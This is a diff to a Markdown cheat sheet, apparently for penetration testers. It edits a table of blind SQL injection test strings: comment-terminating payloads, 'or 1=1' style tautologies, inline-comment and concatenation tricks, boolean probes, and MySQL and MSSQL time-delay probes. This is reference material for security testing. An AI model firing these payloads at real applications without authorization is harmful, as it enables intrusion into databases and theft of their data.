@@ -22,14 +22,16 @@ order: 5
 **Blind Test Strings:**<br>
 *Try the following to see if it provides valid results for text that was interpreted:*
 
-Commenting out the end | <code> Dent' ;# <br> Dent' ;-- <br> Dent' ;-- - </code>
-Commenting with semicolon | <code> Dent' or 1=1; # <br> Dent' or 1=1;-- <br> Dent' or 1=1;-- - </code>
-Commenting without semicolon | <code> Dent' or 1=1 # <br> Dent' or 1=1-- <br> Dent' or 1=1-- - </code>
-Inline Commenting | <code> De'/* */'nt </code>
+Commenting out the end | <code> Brent' ;# <br> Dent' ;-- <br> Dent' ;-- - </code>
+Commenting with semicolon | <code> Brent' or 29=29; # <br> Dent' or 29=29;-- <br> Dent' or 29=29;-- - </code>
+Commenting without semicolon | <code> Brent' or 1=1 # <br> Dent' or 1=1-- <br> Dent' or 1=1-- - </code>
+Inline Commenting | <code> Bre'/* */'nt </code>
 Concatenation | <code> De''nt <br> De'||'nt </code>
 Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
-Sleep 1 | <code> Sleep(10) MySQL <br>  WAITFOR DELAY '0:0:10'  MSSQL </code> 
-Sleep 2 | <code> id=1-sleep(10)  </code>
+Sleep MySQL | <code> Sleep(10) </code>
+Sleep MySQL2 | <code> id=1-sleep(10)  </code>
+Sleep MSSQL | <code> WAITFOR DELAY '0:0:10'  MSSQL </code> 
+
 Math | <code> id=1-0 </code>
 
 
